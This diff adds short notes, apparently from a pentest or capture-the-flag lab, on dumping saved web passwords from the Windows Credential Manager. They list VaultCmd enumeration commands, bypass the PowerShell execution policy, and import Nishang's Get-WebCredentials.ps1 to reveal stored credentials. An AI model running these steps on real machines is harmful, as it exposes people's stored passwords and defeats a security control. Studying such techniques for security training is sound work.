@@ -1,0 +1,25 @@
+first, we will be enumerating to see if theres anything inside of 
+vaultcmd.
+
+vaultcmd /list
+
+by default, windows has two different vaults, one for web, and the other
+for windows machine credentials.
+
+lets check if there is anything stored inside of the web credentials by running
+the vaultcmd commmand with /listproperties 
+VaultCmd /listproperties:"Web Credentials"
+
+now lets try to list more information using the following:
+VaultCmd /listcreds:"Web Credentials"
+
+The VaultCmd is not able to show the password, but we can rely on other PowerShell Scripts such as Get-WebCredentials.ps1,
+https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1
+
+Ensure to execute PowerShell with bypass policy to import it as a module as follows,
+powershell -ex bypass
+
+Import-Module C:\Tools\Get-WebCredentials.ps1
+Get-WebCredentials
+
+boom
